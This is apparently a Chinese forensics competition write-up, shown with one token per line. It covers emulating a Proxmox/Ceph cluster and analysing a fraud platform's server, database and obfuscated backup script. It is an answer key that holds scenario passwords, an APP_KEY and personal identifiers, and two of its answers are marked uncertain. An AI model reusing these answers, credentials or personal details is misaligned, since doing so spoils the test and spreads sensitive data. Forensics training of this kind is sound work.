+`
+资产（人民币）
+`
+>=
+1002541
+.
+17
+);
+运行结果:
+PVE 服务器集群
+¶
+Info
+以下题目分析 pve 集群.
+PVE 集群包含 3 个服务器节点, 每个节点有 2 块硬盘. 用 FTK Imager 加载任意服务器节点的 2 个镜像文件可以看到:
+server*-disk01.E01
+文件是 Proxmox 的系统卷, 其中的
+pve-root
+是系统分区, 在其中可以看到系统的文件:
+可以通过查看该分区, 对一些 PVE 主机的信息进行分析.
+server*-disk02.E01
+文件中有 LVM 卷组, 包含名为
+ceph-*
+的卷:
+Ceph
+Ceph 是一个开源软件定义存储平台, 提供基于通用分布式集群基础的对象存储、块存储和文件存储服务. 自 12 版本(Luminous)起, Ceph 不再依赖任何传统文件系统, 而是通过其自有的存储后端BlueStore直接管理硬盘和固态硬盘, 并能对外提供 POSIX 文件系统接口.
+仿真
+¶
+将任意服务器的镜像添加到火眼仿真中, 进行仿真.
+通过
+ip addr
+查看网络配置信息:
+可以看到设备上共有 4 个网卡, 分别是回环
+lo
+, 物理网卡
+ens160
+和 2 个虚拟网卡
+vmbr*
+.
+ens160
+网卡的状态显示为
+DOWN
+, 代表物理网卡没有启用.
+查看网卡配置文件
+/etc/network/interfaces
+, 可以看到
+vmbr0
+和
+vmbr1
+分别被绑定在
+nic0
+和
+nic1
+:
+但先前查看网络信息时并没有看到
+nic*
+网卡, 需要修改网卡配置文件. 用
+nano /etc/network/interfaces
+编辑网卡配置, 修改为:
+TOML
+auto
+lo
+iface
+lo
+inet
+loopback
+# auto nic0
+# iface nic0 inet manual
+# auto nic1
+# iface nic1 inet manual
+auto
+vmbr0
+iface
+vmbr0
+inet
+static
+address
+192
+.
+168
+.
+0
+.
+50
+/
+24
+gateway
+192
+.
+168
+.
+0
+.
+1
+bridge-ports
+ens160
+#  changed from nic0 to ens160
+bridge-stp
+off
+bridge-fd
+0
+dns-nameservers
+223
+.
+5
+.
+5
+.
+5
+119
+.
+29
+.
+29
+.
+29
+8
+.
+8
+.
+8
+.
+8
+auto
+vmbr1
+iface
+vmbr1
+inet
+static
+address
+192
+.
+168
+.
+1
+.
+50
+/
+24
+# bridge-ports nic1
+bridge-stp
+off
+bridge-fd
+0
+source
+/
+etc
+/
+network
+/
+interfaces
+.
+d
+/*
+之后通过
+systemctl restart networking
+重启网络服务, 即可看到网卡正常工作:
+通过
+service sshd status
+查看 SSH 服务状态, 正常运行:
+正常使用 SSH 连接到服务器:
+访问
+192.168.0.59:8006
+即可进入 PVE 的 WEB 管理页面:
+使用用户名
+root
+和密码
+123456
+(由火眼仿真自动重置)登录, 进入管理页面, 可以看到 3 个 node 都已经正常工作了:
+但是 Ceph 存储池并没有正常工作, 在服务器视图中可以看到所有节点上的 Ceph 存储池的状态都是未知, 说明 Ceph 的监控进程 Ceph monitor 都没有正常工作:
+通过指令
+pvesm status
+查看所有存储资源的状态, 发现 ceph 存储池未激活:
+通过指令
+journalctl -u ceph-mon@pve-node1 -n 200
+查看 Ceph monitor 的日志, 发现错误日志
+bind unable to bind to v2:192.168.170.50:3300/0: (99) Cannot assign requested address
+, Ceph monitor 试图将服务绑定到
+192.168.170.50
+IP 地址, 但虚拟机并未配置该 IP 地址:
+于是需要再次修改 3 个节点的网络配置, 为
+vmbr0
+网卡添加一个
+192.168.170.0/24
+网段的 IP 地址, 以 pve-node1 为例:
+Text Only
+auto lo
+iface lo inet loopback
+auto vmbr0
+iface vmbr0 inet static
+address 192.168.0.50/24
+gateway 192.168.0.1
+bridge-ports ens160
+bridge-stp off
+bridge-fd 0
+dns-nameservers 223.5.5.5 119.29.29.29 8.8.8.8
+iface vmbr0 inet static
+address 192.168.170.50/24
+source /etc/network/interfaces.d/*
+接着重启虚拟机或者重启 Ceph monitor 服务即可. 通过
+systemctl list-units | grep ceph
+指令可以查看所有与 ceph 有关的服务, 其中的
+ceph-mon@pve-node1.service
+为 Ceph monitor 的服务:
+通过
+service ceph-mon@pve-node1 start
+或者
+systemctl start ceph-mon@pve-node1
+来重启 Ceph monitor. 顺便也重启一下另外 2 个与 ceph 相关的服务
+ceph-osd@0
+和
+ceph-mgr@pve-node1
+.
+完全重启之后即可在 PVE 的 WebUI 中看到 Ceph 存储池的详情:
+接着就可以启动 QEMU 虚拟机
+web100
+了, 需要 VMware 开启嵌套虚拟化, 宿主机需要在 BIOS 配置中开启虚拟化, 并且关闭 Win11 的 VBS & HyperV. 详情参考
+关闭基于虚拟化的安全性
+.
+这里演示另外一种方案, 将虚拟机的虚拟硬盘导出进行分析.
+可以看到虚拟机使用的硬盘是
+Ceph_pgscup_pool
+存储池中的
+vm-100-disk-0
+卷:
+并且先前在 Ceph 存储池的信息中看到其类型为
+rbd
+(RADOS Block Device, RADOS 块设备). 使用 RBD 管理工具导出虚拟机的存储盘, 使用 gzip 压缩:
+Bash
+rbd
+export
+Ceph_pgscup_pool/vm-100-disk-0
+-
+|
+gzip
+>
+/root/vm-100-disk-0.raw.gz
+这里 PVE 的根目录的存储空间差点不够用了; 如果不够用的话, 需要给虚拟机挂一块新的虚拟盘.
+接着即可对导出的
+vm-100-disk-0
+虚拟盘进行分析了. 使用火眼仿真对虚拟盘仿真后, 查看 IP 和 SSH 状态:
+01 请给出 pve 主机版本号
+¶
+答案
+9.1.1
+在仿真虚拟机中执行
+pveversion
+:
+02 请给出 pve 主机内核版本
+¶
+答案
+6.17.2-1-pve
+见上题. 或者通过
+uname -a
+查看.
+03 请给出 pve 集群名
+¶
+答案
+pgscup2026
+通过
+pvecm status
+查看 PVE 集群信息:
+04 请给出加入集群所用指纹的前 6 位
+¶
+答案
+F7:2C:A0
+通过
+pvenode cert info
+查看:
+05 请给出 pve 集群中主机所用的时间服务器地址
+¶
+答案
+ntp.aliyun.com
+查看
+etc/systemd/timesyncd.conf
+:
+06 请给出 Ceph 存储的资源池名
+¶
+答案
+Ceph_pgscup_pool
+见上述仿真过程.
+07 请给出 Ceph 存储资源池的类别
+¶
+答案
+RBD
+见上述仿真过程.
+08 请给出 Ceph 集群的 ID 的前 8 位
+¶
+答案
+3f28d8bb
+运行
+ceph -s
+指令查看 Ceph 存储池信息:
+09 请给出 Ceph 存储设置的最小副本数
+¶
+答案
+2
+通过
+ceph osd pool ls detail
+指令查看, 其中的
+min_size
+为最小副本数:
+Bash
+pool
+1
+'.mgr'
+replicated
+size
+3
+min_size
+2
+crush_rule
+0
+object_hash
+rjenkins
+pg_num
+1
+pgp_num
+1
+autoscale_mode
+on
+last_change
+18
+flags
+hashpspool
+stripe_width
+0
+pg_num_max
+32
+pg_num_min
+1
+application
+mgr
+read_balance_score
+3
+.00
+pool
+2
+'Ceph_pgscup_pool'
+replicated
+size
+3
+min_size
+2
+crush_rule
+0
+object_hash
+rjenkins
+pg_num
+32
+pgp_num
+32
+autoscale_mode
+on
+last_change
+452
+lfor
+0
+/450/448
+flags
+hashpspool,selfmanaged_snaps
+stripe_width
+0
+application
+rbd
+read_balance_score
+1
+.31
+10 请给出 pve 集群中虚拟机的快照创建时间
+¶
+答案
+2026-04-16 15:05:19
+在 PVE 的 Web UI 中查看:
+11 对集群内的服务器进行分析，提取该服务器使用的 Linux 内核完整版本号
+¶
+答案
+3.10.0-957.el7.x86_64
+在仿真虚拟机
+vm-100-disk-0
+内运行指令
+uname -a
+:
+12 对集群内的服务器进行分析, 提取该服务器 SSH 服务监听的 TCP 端口号
+¶
+答案
+22
+参考本部分 仿真 小节.
+13 对集群内的服务器进行分析, 提取该服务器网卡的 IP 地址
+¶
+答案
+192.168.0.70
+仿真后的虚拟机的 IP 地址为
+192.168.0.133
+, 但这是 VMware 的虚拟网卡 ens33 通过 DHCP 获得的 IP 地址, 并非 Qemu 虚拟机原本的 IP 地址:
+需要查看原本的网络配置, 在
+/etc/sysconfig/network-scripts
+目录中看到原本的网络配置文件
+ifcfg-eth0
+:
+14 对集群内的服务器进行分析, 提取金麟资本理财网站对应的域名
+¶
+答案
+jlzb.vip
+执行
+nginx -t
+查看 nginx 的配置文件位置:
+接着查看 Nginx 的配置文件
+/etc/nginx/nginx.conf
+:
+Nginx Configuration File
+user
+nginx
+;
+worker_processes
+auto
+;
+error_log
+/var/log/nginx/error.log
+;
+pid
+/run/nginx.pid
+;
+include
+/usr/share/nginx/modules/*.conf
+;
+events
+{
+worker_connections
+1024
+;
+}
+http
+{
+log_format
+main
+'
+$remote_addr
+-
+$remote_user
+[
+$time_local]
+"
+$request"
+'
+'
+$status
+$body_bytes_sent
+"
+$http_referer"
+'
+'"
+$http_user_agent"
+"
+$http_x_forwarded_for"'
+;
+access_log
+/var/log/nginx/access.log
+main
+;
+sendfile
+on
+;
+tcp_nopush
+on
+;
+tcp_nodelay
+on
+;
+keepalive_timeout
+65
+;
+types_hash_max_size
+4096
+;
+include
+/etc/nginx/mime.types
+;
+default_type
+application/octet-stream
+;
+include
+/etc/nginx/conf.d/*.conf
+;
+# 删除了已被注释的部分
+接着查看
+/usr/share/nginx/modules/*.conf
+的内容:
+Nginx Configuration File
+server
+{
+listen
+80
+;
+server_name
+jlzb.vip
+;
+root
+/var/www/html/public
+;
+index
+index.php
+index.html
+;
+location
+/
+{
+try_files
+$uri
+$uri/
+/index.php?
+$query_string
+;
+}
+location
+~
+\.php$
+{
+fastcgi_pass
+127.0.0.1
+:
+9000
+;
+fastcgi_index
+index.php
+;
+fastcgi_param
+SCRIPT_FILENAME
+$document_root$fastcgi_script_name
+;
+include
+fastcgi_params
+;
+}
+location
+~
+/\.ht
+{
+deny
+all
+;
+}
+}
+可以看到网站的域名是
+jlzb.vip
+, 根目录位于
+/var/www/html/public
+.
+15 对集群内的服务器进行分析, 服务器中有个加密工具, 请给出该工具的名字
+¶
+答案
+encrypt_tool.py
+就在 root 目录下有一个
+encrypt_tool.py
+文件, 但查看之后发现这实际上是 sh 脚本:
+打眼一看, 明显是个解压 gzip 的脚本. 脚本最后跟着的二进制数据就是 gz 包了, 用 010 Editor 提取 gzip 数据, 解压, 得到真正的
+encrypt_tool.py
+:
+Python
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+"""
+加密工具 - 用于服务器取证
+适用于数据库备份
+加密层次：
+第1层: XOR加密 (密钥: 0x5A, 位置偏移 i%256)
+第2层: Base64编码
+第3层: 字符替换表 (ABCD...+/ -> ZYXW...+/)
+第4层: 十六进制转换
+用法:
+python encrypt_tool.py --input <文件路径> --output <输出路径>
+python encrypt_tool.py <输入路径> <输出路径>
+python encrypt_tool.py --db --output <输出路径>
+"""
+import
+os
+import
+sys
+import
+base64
+import
+gzip
+import
+subprocess
+import
+argparse
+try
+:
+import
+codecs
+def
+read_file
+(
+path
+):
+with
+codecs
+.
+open
+(
+path
+,
+'r'
+,
+encoding
+=
+'utf-8'
+)
+as
+f
+:
+return
+f
+.
+read
+()
+def
+write_file
+(
+path
+,
+content
+):
+with
+codecs
+.
+open
+(
+path
+,
+'w'
+,
+encoding
+=
+'utf-8'
+)
+as
+f
+:
+f
+.
+write
+(
+content
+)
+except
+ImportError
+:
+# Python 2
+def
+read_file
+(
+path
+):
+with
+open
+(
+path
+,
+'rb'
+)
+as
+f
+:
+return
+f
+.
+read
+()
+.
+decode
+(
+'utf-8'
+)
+def
+write_file
+(
+path
+,
+content
+):
+with
+open
+(
+path
+,
+'wb'
+)
+as
+f
+:
+f
+.
+write
+(
+content
+.
+encode
+(
+'utf-8'
+))
+XOR_KEY
+=
+0x5A
+BASE64_TABLE
+=
+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+CUSTOM_TABLE
+=
+"ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/"
+def
+xor_encrypt
+(
+data
+):
+"""第1层: XOR加密"""
+result
+=
+[]
+for
+i
+,
+c
+in
+enumerate
+(
+data
+):
+result
+.
+append
+(
+chr
+(
+ord
+(
+c
+)
+^
+(
+XOR_KEY
++
+i
+)
+%
+256
+))
+return
+''
+.
+join
+(
+result
+)
+def
+char_swap_encode
+(
+data
+):
+"""第3层: 字符替换编码"""
+trans
+=
+str
+.
+maketrans
+(
+BASE64_TABLE
+,
+CUSTOM_TABLE
+)
+return
+data
+.
+translate
+(
+trans
+)
+def
+obfuscate
+(
+data
+):
+"""4层混淆加密"""
+step1
+=
+xor_encrypt
+(
+data
+)
+step2
+=
+base64
+.
+b64encode
+(
+step1
+.
+encode
+(
+'utf-8'
+))
+.
+decode
+(
+'ascii'
+)
+step3
+=
+char_swap_encode
+(
+step2
+)
+step4
+=
+step3
+.
+encode
+(
+'utf-8'
+)
+.
+hex
+()
+return
+step4
+def
+encrypt_file
+(
+input_path
+,
+output_path
+):
+"""加密目标文件"""
+content
+=
+read_file
+(
+input_path
+)
+obfuscated
+=
+obfuscate
+(
+content
+)
+write_file
+(
+output_path
+,
+obfuscated
+)
+print
+(
+"[OK]
+%s
+->
+%s
+"
+%
+(
+input_path
+,
+output_path
+))
+def
+main
+():
+is_db
+=
+'--db'
+in
+sys
+.
+argv
+# 参数位置判断
+if
+len
+(
+sys
+.
+argv
+)
+>=
+3
+and
+not
+sys
+.
+argv
+[
+1
+]
+.
+startswith
+(
+'-'
+):
+input_path
+=
+sys
+.
+argv
+[
+1
+]
+output_path
+=
+sys
+.
+argv
+[
+2
+]
+else
+:
+parser
+=
+argparse
+.
+ArgumentParser
+(
+description
+=
+'加密文件加密工具'
+)
+parser
+.
+add_argument
+(
+'--input'
+,
+'-i'
+,
+help
+=
+'输入文件路径'
+)
+parser
+.
+add_argument
+(
+'--output'
+,
+'-o'
+,
+help
+=
+'输出文件路径'
+)
+parser
+.
+add_argument
+(
+'--db'
+,
+action
+=
+'store_true'
+,
+help
+=
+'数据库备份模式'
+)
+args
+=
+parser
+.
+parse_args
+()
+input_path
+=
+args
+.
+input
+if
+not
+args
+.
+db
+else
+None
+output_path
+=
+args
+.
+output
+is_db
+=
+args
+.
+db
+print
+(
+"="
+*
+60
+)
+print
+(
+"  数据库文件加密工具"
+)
+print
+(
+"="
+*
+60
+)
+print
+(
+""
+)
+if
+is_db
+:
+db_user
+=
+'root'
+db_pass
+=
+'pgscup@o26'
+db_name
+=
+'jinqin'
+password
+=
+'JDSJ2026@Backup'
+print
+(
+"[*] 正在备份数据库..."
+)
+print
+(
+"    数据库:
+%s
+"
+%
+db_name
+)
+print
+(
+"    输出:
+%s
+"
+%
+output_path
+)
+print
+(
+""
+)
+try
+:
+# 步骤1: mysqldump -> 临时gz文件
+temp_sql
+=
+'/tmp/backup_temp.sql'
+dump_cmd
+=
+'mysqldump -uroot -p"pgscup@o26" --single-transaction --quick
+%s
+>
+%s
+'
+%
+(
+db_name
+,
+temp_sql
+)
+print
+(
+"[*] 执行mysqldump..."
+)
+ret
+=
+os
+.
+system
+(
+dump_cmd
+)
+if
+ret
+!=
+0
+:
+print
+(
+"[ERROR] mysqldump失败, 返回码:
+%d
+"
+%
+ret
+)
+sys
+.
+exit
+(
+1
+)
+print
+(
+"[OK] mysqldump完成"
+)
+# 步骤2: gzip压缩
+temp_gz
+=
+'/tmp/backup_temp.sql.gz'
+gzip_cmd
+=
+'gzip -9 -c <
+%s
+>
+%s
+'
+%
+(
+temp_sql
+,
+temp_gz
+)
+print
+(
+"[*] 执行gzip压缩..."
+)
+ret
+=
+os
+.
+system
+(
+gzip_cmd
+)
+if
+ret
+!=
+0
+:
+print
+(
+"[ERROR] gzip失败, 返回码:
+%d
+"
+%
+ret
+)
+os
+.
+remove
+(
+temp_sql
+)
+sys
+.
+exit
+(
+1
+)
+print
+(
+"[OK] gzip压缩完成"
+)
+os
+.
+remove
+(
+temp_sql
+)
+# 步骤3: openssl加密 (去掉-pbkdf2选项，兼容老版本openssl)
+print
+(
+"[*] 执行openssl加密..."
+)
+openssl_cmd
+=
+'openssl aes-256-cbc -salt -pass pass:
+%s
+-in
+%s
+-out
+%s
+'
+%
+(
+password
+,
+temp_gz
+,
+output_path
+)
+ret
+=
+os
+.
+system
+(
+openssl_cmd
+)
+if
+ret
+!=
+0
+:
+print
+(
+"[ERROR] openssl失败, 返回码:
+%d
+"
+%
+ret
+)
+os
+.
+remove
+(
+temp_gz
+)
+sys
+.
+exit
+(
+1
+)
+print
+(
+"[OK] openssl加密完成"
+)
+os
+.
+remove
+(
+temp_gz
+)
+size
+=
+os
+.
+path
+.
+getsize
+(
+output_path
+)
+print
+(
+""
+)
+print
+(
+"[OK] 完成:
+%s
+(
+%.2f
+MB)"
+%
+(
+output_path
+,
+size
+/
+1024
+/
+1024
+))
+print
+(
+""
+)
+print
+(
+"[INFO] 数据库备份密码:
+%s
+"
+%
+password
+)
+except
+Exception
+as
+e
+:
+print
+(
+"[ERROR]
+%s
+"
+%
+str
+(
+e
+))
+sys
+.
+exit
+(
+1
+)
+else
+:
+if
+not
+input_path
+or
+not
+output_path
+:
+print
+(
+"[ERROR] 请指定输入和输出文件路径"
+)
+print
+(
+"用法: python encrypt_tool.py --input <文件> --output <输出>"
+)
+sys
+.
+exit
+(
+1
+)
+if
+not
+os
+.
+path
+.
+exists
+(
+input_path
+):
+print
+(
+"[ERROR] 文件不存在:
+%s
+"
+%
+input_path
+)
+sys
+.
+exit
+(
+1
+)
+parent_dir
+=
+os
+.
+path
+.
+dirname
+(
+output_path
+)
+if
+parent_dir
+and
+not
+os
+.
+path
+.
+exists
+(
+parent_dir
+):
+os
+.
+makedirs
+(
+parent_dir
+)
+encrypt_file
+(
+input_path
+,
+output_path
+)
+print
+(
+""
+)
+print
+(
+"[OK] 加密完成"
+)
+if
+__name__
+==
+"__main__"
+:
+main
+()
+该脚本与 刘洋计算机 部分第 18 ~ 20 题中的脚本相同.
+16 对集群内的服务器进行分析, 服务器中加密工具在加密数据库备份文件时使用的密码是什么
+¶
+答案
+JDSJ2026@Backup
+接上题, 脚本使用了 openssl 对打包好的 gzip 压缩文件进行了 AES-256-CBC 加密:
+openssl_cmd = 'openssl aes-256-cbc -salt -pass pass:%s -in %s -out %s' % (password, temp_gz, output_path)
+, 其中使用的密码为
+password = 'JDSJ2026@Backup'
+.
+17 对集群内的服务器进行分析, 服务器中加密工具第 1 层加密的 XOR 密钥是什么
+¶
+答案
+0x5A
+参考 刘洋计算机 部分第 19 题.
+18 对集群内的服务器进行分析, 给出 MySQL 数据库 root 用户的密码
+¶
+答案
+pgscup@o26
+接第 15 题, 在脚本中看到
+db_pass = 'pgscup@o26'
+.
+验证一下, 密码正确:
+19 对集群内的服务器进行分析, 请给出网站后台数据库中存放聊天记录的数据表名字
+¶
+答案
+user_chat
+数据库已经空了, 但在
+/tmp
+目录下可以找到临时文件, 大概是 TRAE 生成的临时文件, 其中包含
+backup_decrypted
+和
+jinqin_backup.sql
+文件:
+或者在 lvm 的另外一个分区中可以找到加密后的备份, 解密之后也能用:
+导出并查看文件内容, 发现是 MariaDB 的导出文件:
+用数据库取证工具导入 SQL 文件
+backup_decrypted
+, 进行数据解析. 可以看到存放聊天记录的表是
+user_chat
+:
+20 对集群内的服务器进行分析, 分析网站后台用户密码加密算法中
+type=0
+时的初始盐值是什么
+¶
+答案
+ABCDEFG
+在网站目录
+/var/www/html/vendor
+中可以看到
+laravel
+目录, 由此推断该站点使用 laravel 框架开发.
+在
+app/Users.php
+文件中找到
+MakePassword
+方法:
+PHP
+public static function MakePassword($password, $type = 0)
+{
+if ($type == 0) {
+$salt = 'ABCDEFG';
+$passwordChars = str_split($password);
+foreach ($passwordChars as $char) {
+$salt .= md5($char);
+}
+} else {
+$salt = 'TPSHOP' . $password;
+}
+return md5($salt);
+}
+当
+type=0
+时, 初始盐值为
+ABCDEFG
+.
+21 对集群内的服务器进行应用取证, 提取该 Laravel 应用的 APP_KEY 值的后 8 位
+¶
+答案
+otS+rWI=
+.env
+文件被加密为
+.env.obf
+, 复用刘洋的计算机部分第 20 题"请解密该脚本加密工具加密的文件
+database.php.obf
+, 给出该文件内的数据库密码"的解密脚本:
+Python
+from
+encrypt_tool
+import
+xor_encrypt
+,
+char_swap_encode
+with
+open
+(
+"./.env.obf"
+,
+"r"
+)
+as
+file
+:
+data
+=
+file
+.
+read
+()
+data1
+=
+bytes
+.
+fromhex
+(
+data
+)
+data2
+=
+char_swap_encode
+(
+data1
+.
+decode
+())
+from
+base64
+import
+b64decode
+data3
+=
+b64decode
+(
+data2
+.
+encode
+())
+data4
+=
+xor_encrypt
+(
+data3
+.
+decode
+())
+print
+(
+data4
+)
+解密之后:
+INI
+APP_NAME
+=
+金鳞资本
+APP_ENV
+=
+local
+APP_KEY
+=
+base64:QmhkrWMLYbZsQkINFr5Jd1eNiDEVduTbfSNlotS+rWI=
+APP_DEBUG
+=
+true
+APP_URL
+=
+http://192.168.0.70
+LOG_CHANNEL
+=
+stack
+DB_CONNECTION
+=
+mysql
+DB_HOST
+=
+127.0.0.1
+DB_PORT
+=
+3306
+DB_DATABASE
+=
+jinqin
+DB_USERNAME
+=
+root
+DB_PASSWORD
+=
+pgscup@o26
+BROADCAST_DRIVER
+=
+log
+CACHE_DRIVER
+=
+file
+SESSION_DRIVER
+=
+database
+QUEUE_CONNECTION
+=
+sync
+22 对集群内的服务器进行取证分析, 金麟资本理财网站后台有多少个机器人
+¶
+本题存疑
+25
+robot
+表中有 3 条记录,
+legal_robot
+表中有 2 条记录, 总计 5 个机器人.
+另外, 在
+user_real
+中也可看到 20 个姓名为"机器人"的用户:
+23 对集群内的服务器进行资金流水取证, 提取该平台数据库中聊天记录总数
+¶
+答案
+11494
+查询
+user_chat
+表, 统计总记录数为 11494 条.
+SQL
+SELECT
+COUNT
+(
+*
+)
+FROM
+user_chat
+;
+24 对集群内的服务器进行数据库取证, 提取该平台数据库中注册用户总记录数
+¶
+答案
+21679
+查询
+users
+表, 统计总记录数为 21679 条.
+SQL
+SELECT
+COUNT
+(
+*
+)
+FROM
+users
+;
+25 对集群内的服务器进行取证分析, 提取平台内用户季丽华的身份证号
+¶
+答案
+370100196901274436
+查询
+user_real
+表, 找到用户季丽华的实名信息, 身份证号为 370100196901274436.
+SQL
+SELECT
+*
+FROM
+user_real
+WHERE
+name
+LIKE
+'%季丽华%'
+;
+26 对集群内的服务器进行资金流水取证, 提取该平台数据库中钱包流水金额第二大的用户名字
+¶
+本题存疑
+查询
+wallet_log
+表, 计算每个用户的流水金额, 按金额降序排列:
+用户ID 0 (系统用户): 31956225.43元
+用户ID 11: 1015076.00元
+用户ID 34: 996940.30元
+用户ID 98: 981023.34元
+用户ID 96: 953952.30元
+流水金额第二大的用户 ID 为 11, 但查询
+users
+表未找到该用户信息, 可能为系统用户或已删除用户:
+SQL
+SELECT
+user_id
+,
+SUM
+(
+ABS
+(
+`
+change
+`
+))
+as
+total_amount
+FROM
+wallet_log
+GROUP
+BY
+user_id
+ORDER
+BY
+total_amount
+DESC
+LIMIT
+1
+OFFSET
+1
+;
+27 对集群内的服务器进行数据库取证, 提取该平台法币交易中交易笔数最多的卖家的交易笔数
+¶
+答案
+1727
+查询
+legal_deal
+表, 按
+seller_id
+分组统计交易笔数, 最多的卖家交易笔数为 1727 笔.
+SQL
+SELECT
+seller_id
+,
+COUNT
+(
+*
+)
+as
+deal_count
+FROM
+legal_deal
+GROUP
+BY
+seller_id
+ORDER
+BY
+deal_count
+DESC
+LIMIT
+1
+;
+28 对集群内的服务器进行资金流水取证, 提取该平台已完成结算的杠杆交易中保证金总额最多的用户的保证金总额
+¶
+答案
+37240.76070238
+查询
+lever_transaction
+表, 统计已完成结算(status=3)的杠杆交易保证金总额, 用户 ID 10423 的保证金总额最多, 为
+37240.76070238
+.
+SQL
+SELECT
+user_id
+,
+SUM
+(
+caution_money
+)
+as
+total_margin
+FROM
+lever_transaction
+WHERE
+status
+=
+3
+GROUP
+BY
+user_id
+ORDER
+BY
+total_margin
+DESC
+LIMIT
+1
+;
+29 对集群内的服务器进行资金流水取证, 提取该平台商家中余额最小的商家的手机号
+¶
+答案
+15860623709
+查询
+seller
+表, 按
+seller_balance
+升序排列, 余额最小的商家手机号为 15860623709.
+SQL
+SELECT
+id
+,
+user_id
+,
+name
+,
+mobile
+,
+seller_balance
+FROM
+seller
+ORDER
+BY
+seller_balance
+ASC
+LIMIT
+1
+;
+30 对集群内的服务器进行资金流水取证, 提取该平台商家中余额最小的商家的余额
+¶
+答案
+8461.40000
+查询
+seller
+表, 最小余额为 8461.40000.
+SQL
+SELECT
+MIN
+(
+seller_balance
+)
+as
+min_balance
+FROM
+seller
+;
+锐评环节
+¶
+为了不影响题解观感, 还是把锐评环节放在题解的最后了.
+黄志远的计算机部分
+¶
+命题过度依赖了 AI 生成内容, 而未进行人工核实.
+甚至题目都像是大模型写的.
+很难想象, 出题人在"智能体取证"和"入侵分析"这样的高级命题概念中, 用文档检索的低级技术手段来实现大部分题目.
+这部分题目做下来给我唯一的感受是: 毫无意义.
+林小婉智能手表部分
+¶
+数据缺失, 多数题目无法完成.
+方俊郎 U 盘部分
+¶
+把电影塞进检材就算出题了?
+黄志远汽车车机部分
+¶
+所谓的固件文件实际上根本不是正常的固件, 所有"逆向"题最终都是用 Strings 搜索做的.
+缺少 DBC 文件, CAN 总线数据无法分析.
+这部分的检材不出意外也是 AI 生成的.
